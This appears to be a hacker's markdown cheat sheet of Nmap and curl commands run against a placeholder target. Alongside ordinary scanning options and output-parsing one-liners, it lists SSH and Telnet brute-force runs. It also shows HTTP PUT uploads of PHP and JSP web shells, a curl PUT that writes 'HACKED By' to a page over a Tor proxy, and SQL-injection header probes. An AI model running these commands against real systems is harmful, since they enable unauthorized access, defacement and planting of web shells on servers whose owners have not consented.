# <img width="28" src="http://0z3r00t3r.6te.net/img/folder.png"> Nmap 
##### &#x1F538; options:
    #(OPTION): -P0 |-> skip ping
    #(OPTION): -iL list.txt |-> to scan file with ips websites
    #(OPTION): -T0 / or / -T1 |-> avoid IDS detection firewall
    #(OPTION): -oG scan.txt |-> Grepable output
    #(OPTION): -sW |-> TCP windows port scan
    #(OPTION): -sS / -sT / -sU / -sA / -sM |-> TCP SYN - TCP port - UDP - TCP ACK - TCP Maimon port
    #(OPTION): -sL |-> No scan list targets only
    #(OPTION): -sn |-> disable port scan
    #(OPTION): -Pn |-> disable host - port only
    #(OPTION): -n |-> never do dns resolution

##### &#x1F538; xml.out to use php insert :
    - sudo nmap -d -sV -Pn -F -sS -n -O -A --script=default,external,ssl-heartbleed --script-args shodan-api.apikey=api-Key-Here -oX out.xml <TARGET>

##### &#x1F538; Supported Methods: GET HEAD POST OPTIONS :
    nmap -script http-methods -p443 -script-args http-methods.url-path='/' <TARGET>

##### &#x1F538;  SSH Brute Cmd : 
    nmap -p 22 --script ssh-brute --script-args userdb=/opt/backbox/user.txt,passdb=/opt/backbox/pass.txt --script-args ssh-brute.timeout=4s <TARGET>

##### &#x1F538;  Telnet Brute Cmd : 
    nmap -p 23 --script telnet-brute --script-args userdb=/opt/backbox/user.txt,passdb=/opt/backbox/pass.txt,telnet-brute.timeout=8s <TARGET>

##### &#x1F538;  Put method : 
    nmap -script http-put -script-args http-put.url='/shell.php',http-put.file='/shell.txt' -p 80 <TARGET>

#### &#x1F538; Print options : 

    #print ip + website
      nmap -p80 -Pn -oG - <TARGET>/24 | awk '/open/{print $2 " " $3}'

    #print ip + port open
      nmap -vv <TARGET>/24  | awk -F'[ /]' '/Discovered open port/{print $NF":"$4}'

    #print websites only
      nmap -sL -oG - <TARGET>/24 | awk '$3~/\(.+\)/{print $3}' | tr -d '()'

    #print ip only using port 22
      nmap -n -sn -PS22 -oG - <TARGET>/24 | awk '/Status: Up$/{print $2}'

    #print IP addresses that are up
      nmap -n -sn -oG - <TARGET>/24 | awk '/Status: Up$/{print $2}'

#### &#x1F538; Domains : 
    nmap --script=dns-brute.nse <TARGET>
    nmap --script=auth <TARGET>
    nmap --script=default <TARGET>
    nmap -Pn --script=vuln <TARGET>
    nmap -n -p445 --script=broadcast <TARGET>
    nmap --script external <TARGET>
    nmap -p 53 --script dns-zone-transfer.nse -v <TARGET>
    nmap -Pn -sV --script=vulners <TARGET>
    nmap --script http-methods --script-args http-methods.url-path='/' <TARGET>
    nmap -p 80 --script dns-brute.nse <TARGET>
    nmap -sV --script=vulscan/vulscan.nse <TARGET>
    nmap -O --script external -oX out.xml <TARGET>
    nmap -d --script ssl-heartbleed --script-args vulns.showall -sV <TARGET> -oX s.xml
    sudo nmap -PN -F -O -A --script=default,external,ssl-heartbleed -sV -oX targetoutput.xml -d <TARGET>
    nmap -sV --script ./sourcfile.nse <TARGET>
    nmap -sV --script http-sec-headers.nse <TARGET>
    nmap -F --script icap-info <TARGET>
    nmap --script=http-enum -p80 -n 
    nmap -p 1344 --script icap-info <TARGET>
    
    
# <img width="28" src="http://0z3r00t3r.6te.net/img/folder.png"> Curl : 

##### &#x1F538; print server name using curl
`curl -i -v --url <TARGET> 2> /dev/null | grep Server`

##### &#x1F538; SCAN 443 With Curl
`curl -insecure -v -X OPTIONS <TARGET>`
    
##### &#x1F538; Curl Injection :     
`curl -v --header "X-CustomHeader: SQLi" --cookie "Set-Cookie:SQLi" --user-agent "User-Agent: SQLi" -H "Accept: application/json-SQLi" -H "Set-Cookie: SQLi"\"  <TARGET>`
    
##### &#x1F538; PUT FILE WITH Curl :
`curl -i -X PUT -H "Content-Type: text/plain; charset=utf-8" -d "HACKED By" <TARGET>/x.php --socks5 127.0.0.1:9050`

##### &#x1F538; AnyCMD:
    #Bypass : `curl --resolve www.DOMAIN.com:80:127.0.0.1 <TARGET>`
    #http Status : `curl -sL -w "%{http_code}\n" "<TARGET/DOMAIN>" -o /dev/null`
    
##### &#x1F538; Requested Range Not Stisfiable vulnerable : 
    curl -v <TARGET> -H "Host: <TARGET>" -H "Range: bytes=0-18446744073709551615" -k
   
   #Turn WiFi OFF : `nmcli radio wifi off` &#x274C;
   
   #Turn WiFi ON : `nmcli radio wifi on` &#x2714;
   
##### &#x1F538; generate shell as js or jsp and use terminal to upload to the target:  

`proxychains curl -X PUT <TARGET>:79/admin/js.jsp -d @- < /opt/shell.js`

 
    
